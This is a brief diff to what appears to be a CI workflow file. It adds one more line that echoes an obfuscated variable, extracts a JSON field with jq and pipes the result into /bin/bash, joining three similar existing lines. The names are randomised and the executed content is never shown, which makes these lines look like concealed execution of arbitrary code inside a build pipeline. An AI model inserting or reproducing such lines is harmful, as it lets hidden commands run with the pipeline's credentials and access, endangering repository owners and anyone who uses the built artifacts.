@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$gthm00944" | jq -r .ybdsb75060 | /bin/bash
           printf '%s' "$ccfv67" | jq -r .ghci6 | /bin/bash
           printf '%s' "$tlm150" | jq -r .phrz061 | /bin/bash
+          echo $fr9723 | jq -r .cdi1 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
